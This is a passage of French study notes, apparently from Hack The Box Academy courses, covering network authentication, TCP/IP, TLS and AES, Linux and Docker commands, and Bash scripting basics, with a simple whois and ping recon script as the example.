<li><strong>OAuth / OpenID / SAML / SSO</strong> : délèguent l’authentification à un fournisseur d’identité (IdP).</li>
<li><strong>PAP / CHAP / EAP / PEAP / LEAP</strong> : utilisés surtout pour accès réseau (PPP, VPN, Wi-Fi 802.1X).
<ul>
<li>LEAP est obsolète et vulnérable.</li>
<li><strong>PEAP + MSCHAPv2 ou EAP-TLS</strong> sont beaucoup plus robustes.</li>
</ul></li>
<li><strong>2FA / MFA</strong> : ajout d’un second facteur (TOTP, SMS, clé physique, biométrie).</li>
</ul>
<p>Ce qui compte pour nous en sécu :</p>
<ul>
<li>Préférer des schémas <strong>mutuellement authentifiés</strong> (certificats, Kerberos, EAP-TLS) plutôt qu’un simple mot de passe.</li>
<li>Éviter PAP et LEAP en production → privilégier EAP-TLS, PEAP, SSH avec clés, etc.</li>
</ul>
<h3>Mini-lab rapide</h3>
<p>Sur un site HTTPS, vérifier le certificat et le protocole :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>openssl<span class="w"> </span>s_client<span class="w"> </span>-connect<span class="w"> </span>target.lab:443<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="p">|</span><span class="w"> </span>openssl<span class="w"> </span>x509<span class="w"> </span>-noout<span class="w"> </span>-subject<span class="w"> </span>-issuer<span class="w"> </span>-dates
</code></pre>
</div>
<h1>Connexions TCP/UDP et analyse réseau</h1>
<h2>TCP vs UDP</h2>
<ul>
<li><strong>TCP</strong> :
<ul>
<li>connexion orientée (3-way handshake SYN/SYN-ACK/ACK),</li>
<li>fiable (retransmissions, numéros de séquence, ACK, fenêtre, contrôle de flux),</li>
<li>utilisé pour HTTP(S), SSH, SMTP, etc.</li>
</ul></li>
<li><strong>UDP</strong> :
<ul>
<li>pas de connexion logique, pas d’ACK, pas de retransmission,</li>
<li>utile quand la <strong>vitesse</strong> est prioritaire à la fiabilité : VoIP, DNS, streaming, jeux en ligne, etc.</li>
</ul></li>
</ul>
<h3>Observer une poignée de main TCP</h3>
<div class="codehilite">
<pre><span></span><code><span class="c1"># Sur ton interface VPN HTB par exemple</span>
sudo<span class="w"> </span>tcpdump<span class="w"> </span>-n<span class="w"> </span>-i<span class="w"> </span>tun0<span class="w"> </span><span class="s1">'tcp[tcpflags] &amp; (tcp-syn|tcp-ack) != 0'</span>
</code></pre>
</div>
<p>Tu verras les SYN / SYN-ACK / ACK défiler.</p>
<h2>IP header, TTL, ID &amp; traçage</h2>
<ul>
<li>L’<strong>en-tête IP</strong> contient, entre autres :
<ul>
<li><code>TTL</code> : nombre de sauts restants (utilisé par <code>traceroute</code>).</li>
<li><code>ID</code> : identifiant de fragment ; sur certaines stacks, il permet de voir que plusieurs IP appartiennent au <strong>même host</strong> (IP ID qui s’incrémente de façon continue).</li>
<li><code>Protocol</code> : 6 (TCP), 17 (UDP), 1 (ICMP)…</li>
</ul></li>
</ul>
<h3>Exemples pratiques</h3>
<p>Tracer un chemin (TTL + ICMP) :</p>
<div class="codehilite">
<pre><span></span><code>traceroute<span class="w"> </span>-T<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">10</span>.10.10.10<span class="w">      </span><span class="c1"># traceroute TCP</span>
<span class="c1"># ou</span>
traceroute<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w">              </span><span class="c1"># UDP (Unix)</span>
</code></pre>
</div>
<p>Utiliser l’option <strong>Record-Route</strong> de <code>ping</code> (quand autorisée) :</p>
<div class="codehilite">
<pre><span></span><code>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">1</span><span class="w"> </span>-R<span class="w"> </span><span class="m">10</span>.129.x.y
</code></pre>
</div>
<p>On obtient les IP intermédiaires vues par le paquet (option IP <code>RR</code>).</p>
<h2>Blind spoofing (idée)</h2>
<p>Le <strong>blind spoofing</strong> consiste à forger des paquets IP/TCP avec une <strong>fausse IP source</strong> et des numéros de séquence devinés, <strong>sans voir les réponses</strong>.</p>
<p>Aujourd’hui, ça reste surtout théorique sur Internet à cause :</p>
<ul>
<li>des filtres anti-spoofing (BCP 38),</li>
<li>des pare-feux stateful,</li>
<li>des numéros de séquence TCP randomisés.</li>
</ul>
<p>Mais en environnement de lab, ça permet de comprendre la dépendance des connexions TCP aux numéros de séquence et à l’IP source.</p>
<h1>Cryptographie côté réseau</h1>
<h2>Symétrique vs asymétrique</h2>
<ul>
<li><strong>Chiffrement symétrique</strong> : même clé pour chiffrer/déchiffrer.
<ul>
<li>Rapide, idéal pour gros volumes de données.</li>
<li>Ex : <strong>AES</strong>, anciennement <strong>DES / 3DES</strong> (obsolètes).</li>
</ul></li>
<li><strong>Chiffrement asymétrique</strong> : paire <strong>clé publique / clé privée</strong>.
<ul>
<li>Sert à chiffrer de petites données, échanger une clé symétrique, signer.</li>
<li>Ex : <strong>RSA</strong>, <strong>ECC</strong> (ECDH, ECDSA), PGP.</li>
</ul></li>
</ul>
<p>Schéma typique d’une session TLS :</p>
<ol>
<li>Négociation → échange de clé (ECDHE).</li>
<li>Le secret partagé sert à dériver des clés <strong>AES-GCM</strong> pour chiffrer le flux.</li>
<li>RSA/ECDSA ne chiffre pas tout le trafic, il sert à <strong>authentifier</strong> le serveur (signature du certificat).</li>
</ol>
<h3>Petit test AES en ligne de commande</h3>
<div class="codehilite">
<pre><span></span><code><span class="c1"># Chiffrer</span>
openssl<span class="w"> </span>enc<span class="w"> </span>-aes-256-cbc<span class="w"> </span>-pbkdf2<span class="w"> </span>-salt<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-in<span class="w"> </span>secret.txt<span class="w"> </span>-out<span class="w"> </span>secret.txt.enc

<span class="c1"># Déchiffrer</span>
openssl<span class="w"> </span>enc<span class="w"> </span>-d<span class="w"> </span>-aes-256-cbc<span class="w"> </span>-pbkdf2<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-in<span class="w"> </span>secret.txt.enc<span class="w"> </span>-out<span class="w"> </span>secret_decrypted.txt
</code></pre>
</div>
<h2>DES, 3DES et AES</h2>
<ul>
<li><strong>DES</strong> : 56 bits de clé → aujourd’hui <strong>cassable</strong> par brute force.</li>
<li><strong>3DES</strong> : appliqué 3 fois → plus robuste mais lent, et considéré comme <strong>legacy</strong>.</li>
<li><strong>AES (128/192/256)</strong> : standard moderne, utilisé dans :
<ul>
<li>Wi-Fi WPA2/WPA3,</li>
<li>IPsec,</li>
<li>SSH, TLS,</li>
<li>chiffrage disque (BitLocker, LUKS).</li>
</ul></li>
</ul>
<h2>Modes de chiffrement</h2>
<p>AES est un <strong>bloc</strong> de 128 bits ; les <strong>modes</strong> définissent comment on chiffre plusieurs blocs :</p>
<ul>
<li><strong>ECB</strong> : mêmes blocs → mêmes chiffrés, fuit les patterns → à éviter.</li>
<li><strong>CBC</strong> : chaque bloc dépend du précédent (utilisé dans anciens TLS).</li>
<li><strong>CFB / OFB / CTR</strong> : transforment un bloc en chiffrement de flux.</li>
<li><strong>GCM</strong> : mode compteur + authentification intégrée (confidentialité + intégrité).
<ul>
<li>Très utilisé dans TLS modernes (<code>AES-GCM</code>), IPsec, VPN.</li>
</ul></li>
</ul>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Linux Fundamentals</strong></summary><div class="indented"><h2>Web Recon avec <code>curl</code></h2>
<div class="codehilite">
<pre><span></span><code><span class="c1"># Récupérer code source et extraire les chemins uniques</span>
curl<span class="w"> </span>-s<span class="w"> </span>https://www.inlanefreight.com<span class="w"> </span><span class="se">\</span>
<span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oP<span class="w"> </span><span class="s1">'(?&lt;=href=")https://www.inlanefreight.com[^"]+'</span><span class="w"> </span><span class="se">\</span>
<span class="p">|</span><span class="w"> </span>sed<span class="w"> </span><span class="s1">'s#https://www.inlanefreight.com##'</span><span class="w"> </span><span class="se">\</span>
<span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">'?'</span><span class="w"> </span>-f1<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u

<span class="c1"># Compter le nombre de chemins</span>
curl<span class="w"> </span>-s<span class="w"> </span>https://www.inlanefreight.com<span class="w"> </span><span class="se">\</span>
<span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oP<span class="w"> </span><span class="s1">'(?&lt;=href=")https://www.inlanefreight.com[^"]+'</span><span class="w"> </span><span class="se">\</span>
<span class="p">|</span><span class="w"> </span>sed<span class="w"> </span><span class="s1">'s#https://www.inlanefreight.com##'</span><span class="w"> </span><span class="se">\</span>
<span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">'?'</span><span class="w"> </span>-f1<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u<span class="w"> </span><span class="p">|</span><span class="w"> </span>wc<span class="w"> </span>-l
</code></pre>
</div>
<h2>Lancer un serveur local</h2>
<h3>Avec <strong>PHP</strong></h3>
<div class="codehilite">
<pre><span></span><code>php<span class="w"> </span>-S<span class="w"> </span><span class="m">127</span>.0.0.1:8080
</code></pre>
</div>
<h3>Avec <strong>NPM (http-server)</strong></h3>
<div class="codehilite">
<pre><span></span><code>npx<span class="w"> </span>http-server<span class="w"> </span>-p<span class="w"> </span><span class="m">8080</span>
</code></pre>
</div>
<h2>Docker (Pwnbox / Linux Fundamentals)</h2>
<h3>Vérifier et lancer Docker</h3>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>systemctl<span class="w"> </span>start<span class="w"> </span>docker
sudo<span class="w"> </span>systemctl<span class="w"> </span>status<span class="w"> </span>docker
</code></pre>
</div>
<h3>Test de Docker</h3>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>docker<span class="w"> </span>run<span class="w"> </span>hello-world
</code></pre>
</div>
<h3>Construire une image (depuis Dockerfile)</h3>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>docker<span class="w"> </span>build<span class="w"> </span>-t<span class="w"> </span>fs_docker<span class="w"> </span>.
</code></pre>
</div>
<h3>Lancer un conteneur (Apache + SSH)</h3>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>docker<span class="w"> </span>run<span class="w"> </span>-p<span class="w"> </span><span class="m">8022</span>:22<span class="w"> </span>-p<span class="w"> </span><span class="m">8080</span>:80<span class="w"> </span>-d<span class="w"> </span>fs_docker
</code></pre>
</div>
<h3>Gestion des conteneurs</h3>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>docker<span class="w"> </span>ps<span class="w">         </span><span class="c1"># Voir conteneurs actifs</span>
sudo<span class="w"> </span>docker<span class="w"> </span>stop<span class="w"> </span>&lt;id&gt;<span class="w">  </span><span class="c1"># Stopper</span>
sudo<span class="w"> </span>docker<span class="w"> </span>start<span class="w"> </span>&lt;id&gt;<span class="w"> </span><span class="c1"># Relancer</span>
sudo<span class="w"> </span>docker<span class="w"> </span>logs<span class="w"> </span>&lt;id&gt;<span class="w">  </span><span class="c1"># Voir logs</span>
</code></pre>
</div>
<h2>Autres utiles HTB</h2>
<h3>Vérifier un service systemd</h3>
<div class="codehilite">
<pre><span></span><code>systemctl<span class="w"> </span>show<span class="w"> </span>dconf.service<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="nv">Type</span><span class="o">=</span>
systemctl<span class="w"> </span>status<span class="w"> </span>dconf.service
</code></pre>
</div>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Introduction to Bash Scripting</strong></summary><div class="indented"><h2>Pourquoi Bash est important en pentest</h2>
<p>Bash (<strong>Bourne Again Shell</strong>) est le shell et langage de script standard sur la plupart des systèmes Unix/Linux.</p>
<p>En pentest / privesc, il sert à :</p>
<ul>
<li><strong>Automatiser</strong> les tâches répétitives (scan, parsing de logs, traitement de wordlists…).</li>
<li><strong>Filtrer / transformer</strong> rapidement de gros volumes de données (pipelines avec <code>grep</code>, <code>awk</code>, <code>cut</code>, etc.).</li>
<li><strong>Chaîner des commandes</strong> et exploiter leurs sorties pour gagner du temps (au lieu de tout faire à la main).</li>
</ul>
<p>Un script Bash n’a pas besoin de compilation : il est interprété directement par le shell (<code>/bin/bash</code>).</p>
<p>Exécution typique :</p>
<div class="codehilite">
<pre><span></span><code>bash<span class="w"> </span>script.sh<span class="w"> </span>&lt;args&gt;<span class="w">      </span><span class="c1"># explicite</span>
sh<span class="w"> </span>script.sh<span class="w"> </span>&lt;args&gt;<span class="w">        </span><span class="c1"># autre interpréteur (sh)</span>
./script.sh<span class="w"> </span>&lt;args&gt;<span class="w">         </span><span class="c1"># si exécutable + shebang correct</span>
</code></pre>
</div>
<h2>Structure d’un script Bash (exemple : CIDR.sh)</h2>
<p>Le script <strong>CIDR.sh</strong> est un bon exemple “réel” :</p>
<ol>
<li><strong>Vérification des arguments</strong></li>
<li><strong>Fonction</strong> pour récupérer le NetRange / CIDR via <code>whois</code></li>
<li><strong>Fonction</strong> pour ping toutes les IP du range</li>
<li><strong>Résolution DNS</strong> du domaine pour obtenir les IP</li>
<li><strong>Menu interactif</strong> avec <code>read</code> + <code>case</code> pour choisir l’action</li>
</ol>
<div class="codehilite">
<pre><span></span><code><span class="ch">#!/bin/bash          # Shebang : interpréteur utilisé</span>

<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$#</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">  </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"You need to specify the target domain.\n"</span>
<span class="w">  </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"Usage:"</span>
<span class="w">  </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"\t</span><span class="nv">$0</span><span class="s2"> &lt;domain&gt;"</span>
<span class="w">  </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
<span class="k">else</span>
<span class="w">  </span><span class="nv">domain</span><span class="o">=</span><span class="nv">$1</span>
<span class="k">fi</span>
</code></pre>
</div>
<p>Ce bloc montre déjà plusieurs briques :</p>
<ul>
<li><strong>Shebang</strong> (<code>#!/bin/bash</code>) : indique quel interpréteur exécute le script.</li>
<li><strong>Condition if/else</strong> pour vérifier le nombre d’arguments.</li>
<li><strong>Variables spéciales</strong> :
<ul>
<li><code>$#</code> : nombre d’arguments</li>
<li><code>$0</code> : nom du script</li>
<li><code>$1</code> : premier argument (ici le domaine)</li>
</ul></li>
<li><strong>Variable classique</strong> : <code>domain=$1</code>.</li>
</ul>
<h2>Arguments, variables et tableaux</h2>
<h3>Arguments &amp; variables spéciales</h3>
<p>Bash fournit des variables pré-définies pour les arguments :</p>
<ul>
<li><code>$0</code> : nom du script</li>
<li><code>$1</code> à <code>$9</code> : 1er, 2e… 9e argument</li>
<li><code>$#</code> : nombre d’arguments</li>
<li><code>$@</code> : liste de tous les arguments</li>
<li><code>$?</code> : code de retour de la dernière commande</li>
<li><code>$$</code> : PID du shell courant</li>
</ul>
<p>Exemple simple :</p>
<div class="codehilite">
<pre><span></span><code>./script.sh<span class="w"> </span>ARG1<span class="w"> </span>ARG2<span class="w"> </span>ARG3
<span class="c1"># -&gt; $0 = ./script.sh, $1 = ARG1, $2 = ARG2, $3 = ARG3</span>
</code></pre>
</div>
<p>Déclaration de variable :</p>
<div class="codehilite">
<pre><span></span><code><span class="nv">variable</span><span class="o">=</span><span class="s2">"valeur"</span>
<span class="nb">echo</span><span class="w"> </span><span class="s2">"</span><span class="nv">$variable</span><span class="s2">"</span>
</code></pre>
</div>
<blockquote>
<p>Important : pas d’espace autour du = ; sinon Bash interprète ça comme une commande.</p>
</blockquote>
<h3>Tableaux</h3>
<p>Les tableaux permettent de stocker plusieurs valeurs dans une seule variable :</p>
<div class="codehilite">
<pre><span></span><code><span class="nv">domains</span><span class="o">=(</span>www.inlanefreight.com<span class="w"> </span>ftp.inlanefreight.com<span class="w"> </span>vpn.inlanefreight.com<span class="o">)</span>

<span class="nb">echo</span><span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">domains</span><span class="p">[0]</span><span class="si">}</span><span class="s2">"</span><span class="w">    </span><span class="c1"># www.inlanefreight.com</span>
</code></pre>
</div>
<p>Les guillemets permettent de grouper plusieurs valeurs dans un seul élément :</p>
<div class="codehilite">
<pre><span></span><code><span class="nv">domains</span><span class="o">=(</span><span class="s2">"www.inlanefreight.com ftp.inlanefreight.com vpn.inlanefreight.com"</span><span class="w"> </span>www2.inlanefreight.com<span class="o">)</span>

<span class="nb">echo</span><span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">domains</span><span class="p">[0]</span><span class="si">}</span><span class="s2">"</span><span class="w">    </span><span class="c1"># les trois premiers domaines en une seule chaîne</span>
<span class="nb">echo</span><span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">domains</span><span class="p">[1]</span><span class="si">}</span><span class="s2">"</span><span class="w">    </span><span class="c1"># www2.inlanefreight.com</span>
</code></pre>
</div>
<h2>Exécution conditionnelle &amp; opérateurs de comparaison</h2>
<h3>If / elif / else</h3>
<p>Les blocs <code>if</code> permettent d’exécuter certaines commandes seulement si la condition est vraie :</p>
<div class="codehilite">
<pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">"</span><span class="nv">$value</span><span class="s2">"</span><span class="w"> </span>-gt<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Greater than 10"</span>
<span class="k">elif</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">"</span><span class="nv">$value</span><span class="s2">"</span><span class="w"> </span>-lt<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Less than 10"</span>
<span class="k">else</span>
<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Equal or not a number"</span>
<span class="k">fi</span>
</code></pre>
</div>
<p>Tu peux chaîner :</p>
<ul>
<li><strong><code>if</code> seul</strong></li>
<li><strong><code>if … elif … else … fi</code></strong> pour plusieurs cas</li>
</ul>
<h3>Types d’opérateurs</h3>
<ul>
<li><strong>Integer (<code>[ ]</code>)</strong>
<ul>
<li><code>eq</code> (égal), <code>ne</code> (≠), <code>lt</code> (&lt;), <code>le</code> (≤), <code>gt</code> (&gt;), <code>ge</code> (≥)</li>
</ul></li>
<li><strong>String</strong>
<ul>
<li><code>==</code>, <code>!=</code>, <code>z</code> (chaîne vide), <code>n</code> (non vide)</li>
<li><code>&lt;</code> / <code>&gt;</code> pour ordre ASCII, seulement dans <code>[[ … ]]</code></li>
</ul></li>
<li><strong>Fichiers</strong>
<ul>
<li><code>e</code> existe, <code>f</code> fichier, <code>d</code> dossier, <code>r</code> lisible, <code>w</code> écrivable, <code>x</code> exécutable, etc.</li>
</ul></li>
<li><strong>Logique</strong>
<ul>
<li><code>!</code> (NOT), <code>&amp;&amp;</code> (AND), <code>||</code> (OR)</li>
</ul></li>
</ul>
<p>Exemple de test de fichier :</p>
<div class="codehilite">
<pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>-r<span class="w"> </span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Readable file"</span>
<span class="k">else</span>
<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Not readable or does not exist"</span>
<span class="k">fi</span>
</code></pre>
</div>
<h2>Arithmétique &amp; longueur de variables</h2>
<p>Bash sait faire de l’arithmétique simple :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="k">$((</span><span class="m">10</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m">10</span><span class="k">))</span><span class="w">   </span><span class="c1"># 20</span>
<span class="o">((</span>counter++<span class="o">))</span><span class="w">       </span><span class="c1"># incrément</span>
<span class="o">((</span>counter--<span class="o">))</span><span class="w">       </span><span class="c1"># décrément</span>
</code></pre>
</div>
<p>Longueur d’une variable (très utile pour certains exercices HTB) :</p>
<div class="codehilite">
<pre><span></span><code><span class="nv">var</span><span class="o">=</span><span class="s2">"HackTheBox"</span>
<span class="nb">echo</span><span class="w"> </span><span class="si">${#</span><span class="nv">var</span><span class="si">}</span><span class="w">        </span><span class="c1"># 10</span>
</code></pre>
</div>
<h2>Entrées / sorties : <code>read</code>, redirections et <code>tee</code></h2>
<h3>Input utilisateur</h3>
<p><code>read</code> permet de demander une saisie interactive :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">read</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"Select your option: "</span><span class="w"> </span>opt
</code></pre>
</div>
<p>Dans <strong>CIDR.sh</strong>, cette valeur est ensuite utilisée dans un <code>case</code> pour choisir une action :</p>
<div class="codehilite">
<pre><span></span><code><span class="k">case</span><span class="w"> </span><span class="nv">$opt</span><span class="w"> </span><span class="k">in</span>
<span class="w">  </span><span class="s2">"1"</span><span class="o">)</span><span class="w"> </span>network_range<span class="w"> </span><span class="p">;;</span>
<span class="w">  </span><span class="s2">"2"</span><span class="o">)</span><span class="w"> </span>ping_host<span class="w"> </span><span class="p">;;</span>
<span class="w">  </span><span class="s2">"3"</span><span class="o">)</span><span class="w"> </span>network_range<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>ping_host<span class="w"> </span><span class="p">;;</span>
<span class="w">  </span><span class="s2">"*"</span><span class="o">)</span><span class="w"> </span><span class="nb">exit</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="p">;;</span>
<span class="k">esac</span>
</code></pre>
</div>
<h3>Redirections &amp; <code>tee</code></h3>
<p>Plutôt que de rediriger la sortie vers un fichier <strong>ou</strong> vers l’écran, <code>tee</code> fait les deux :</p>
<div class="codehilite">
<pre><span></span><code>whois<span class="w"> </span><span class="s2">"</span><span class="nv">$ip</span><span class="s2">"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"CIDR"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>CIDR.txt
</code></pre>
</div>
<ul>
<li>Tu vois le résultat en live dans le terminal</li>
<li>Il est enregistré en même temps dans le fichier (avec <code>a</code> pour <em>append</em>)</li>
</ul>
<h2>Boucles : for / while / until</h2>
<h3><code>for</code></h3>
<p>Très utile pour boucler sur :</p>
<ul>
<li>une liste de valeurs</li>
<li>un tableau</li>
<li>une plage (<code>{1..40}</code>)</li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="k">for</span><span class="w"> </span>ip<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">10</span>.10.10.170<span class="w"> </span><span class="m">10</span>.10.10.174<span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">  </span>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="s2">"</span><span class="nv">$ip</span><span class="s2">"</span>
<span class="k">done</span>
</code></pre>
</div>
<p>Dans <strong>CIDR.sh</strong>, <code>for</code> sert à :</p>
<ul>
<li>parcourir la liste d’IP pour faire les <code>whois</code></li>
<li>parcourir le range CIDR pour ping toutes les IP</li>
</ul>
<h3><code>while</code></h3>
<p>S’exécute <strong>tant que</strong> la condition est vraie :</p>
<div class="codehilite">
<pre><span></span><code><span class="nv">counter</span><span class="o">=</span><span class="m">0</span>
<span class="k">while</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">"</span><span class="nv">$counter</span><span class="s2">"</span><span class="w"> </span>-lt<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">  </span><span class="o">((</span>counter++<span class="o">))</span>
<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Counter: </span><span class="nv">$counter</span><span class="s2">"</span>
<span class="k">done</span>
</code></pre>
</div>
<p>Dans <strong>CIDR.sh</strong>, le <code>while</code> est utilisé comme “mini boucle une seule fois” contrôlée par <code>stat</code> :</p>
<div class="codehilite">
<pre><span></span><code><span class="nv">stat</span><span class="o">=</span><span class="m">1</span>
<span class="k">while</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$stat</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">  </span>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="s2">"</span><span class="nv">$host</span><span class="s2">"</span><span class="w"> </span>&gt;<span class="w"> </span>/dev/null<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$?</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"</span><span class="nv">$host</span><span class="s2"> is up."</span>
<span class="w">    </span><span class="o">((</span>hosts_up++<span class="o">))</span>
<span class="w">  </span><span class="k">else</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"</span><span class="nv">$host</span><span class="s2"> is down."</span>
<span class="w">  </span><span class="k">fi</span>
<span class="w">  </span><span class="o">((</span>hosts_total++<span class="o">))</span>
<span class="w">  </span><span class="o">((</span>stat--<span class="o">))</span><span class="w">       </span><span class="c1"># permet de sortir de la boucle</span>
<span class="k">done</span>
</code></pre>
</div>
<h3><code>until</code></h3>
<p>Même principe que <code>while</code>, mais l’inverse :</p>
<ul>
<li><code>while</code> → boucle tant que la condition est <strong>vraie</strong></li>
<li><code>until</code> → boucle tant que la condition est <strong>fausse</strong></li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="nv">counter</span><span class="o">=</span><span class="m">0</span>
<span class="k">until</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">"</span><span class="nv">$counter</span><span class="s2">"</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">  </span><span class="o">((</span>counter++<span class="o">))</span>
<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Counter: </span><span class="nv">$counter</span><span class="s2">"</span>
<span class="k">done</span>
</code></pre>
</div>
<h2>Branches : <code>case</code> (switch–case)</h2>
<p>Alternative à <code>if/elif/else</code> quand tu compares une variable à des valeurs fixes :</p>
<div class="codehilite">
<pre><span></span><code><span class="k">case</span><span class="w"> </span><span class="nv">$opt</span><span class="w"> </span><span class="k">in</span>
<span class="w">  </span><span class="s2">"1"</span><span class="o">)</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Option 1"</span><span class="w"> </span><span class="p">;;</span>
<span class="w">  </span><span class="s2">"2"</span><span class="o">)</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Option 2"</span><span class="w"> </span><span class="p">;;</span>
<span class="w">  </span>*<span class="o">)</span><span class="w">   </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Default"</span><span class="w">  </span><span class="p">;;</span>
<span class="k">esac</span>
</code></pre>
</div>
<p>Dans <strong>CIDR.sh</strong>, c’est utilisé pour proposer un <strong>menu</strong> interactif :</p>
<ul>
<li><code>1</code> → lancer <code>network_range</code></li>
<li><code>2</code> → lancer <code>ping_host</code></li>
<li><code>3</code> → les deux</li>
<li>autre → quitter</li>
</ul>
<h2>Fonctions &amp; codes de retour</h2>
<h3>Fonctions</h3>
<p>Deux syntaxes équivalentes :</p>
<div class="codehilite">
<pre><span></span><code><span class="k">function</span><span class="w"> </span>name<span class="w"> </span><span class="o">{</span>
<span class="w">  </span>commands
<span class="o">}</span>

name<span class="o">()</span><span class="w"> </span><span class="o">{</span>
<span class="w">  </span>commands
<span class="o">}</span>
</code></pre>
</div>
<p>Tu peux :</p>
<ul>
<li>factoriser du code réutilisé plusieurs fois</li>
<li>améliorer la lisibilité</li>
<li>passer des paramètres comme pour un script (<code>$1</code>, <code>$2</code>, …)</li>
</ul>
<p>Exemple :</p>
<div class="codehilite">
<pre><span></span><code><span class="k">function</span><span class="w"> </span>print_pars<span class="w"> </span><span class="o">{</span>
<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span><span class="w"> </span><span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span><span class="w"> </span><span class="s2">"</span><span class="nv">$3</span><span class="s2">"</span>
<span class="o">}</span>

print_pars<span class="w"> </span><span class="s2">"First"</span><span class="w"> </span><span class="s2">"Second"</span><span class="w"> </span><span class="s2">"Third"</span>
</code></pre>
</div>
<p>Dans <strong>CIDR.sh</strong>, on retrouve :</p>
<ul>
